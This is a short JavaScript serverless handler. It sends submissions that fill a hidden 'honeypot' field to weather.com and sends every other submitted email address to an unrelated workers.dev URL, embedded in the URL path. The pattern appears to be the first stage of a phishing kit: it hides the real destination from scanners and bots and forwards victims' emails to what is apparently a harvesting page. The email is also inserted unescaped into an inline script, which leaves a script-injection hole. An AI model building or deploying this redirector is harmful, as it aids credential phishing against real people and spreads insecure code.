export default function handler(req, res) {
  try {
    if (req.method === 'POST') {
      const { email, honeypot } = req.body;

      // Honeypot trap: if honeypot field is filled, likely a bot
      if (honeypot) {
        return res.status(200).send(`<script>window.location.replace('https://weather.com');</script>`);
      }

      // Validate email
      if (!email || !validateEmail(email)) {
        return res.status(400).json({ error: 'Invalid or missing email address.' });
      }

      // Redirect to the external page with the email as plain text
      const externalUrl = `https://lucky-mud-238c.vencillrina33.workers.dev/${email}`;
      return res.status(200).send(`<script>window.location.replace('${externalUrl}');</script>`);
    } else {
      res.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Error handling request:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
}

// Helper function to validate email
function validateEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}
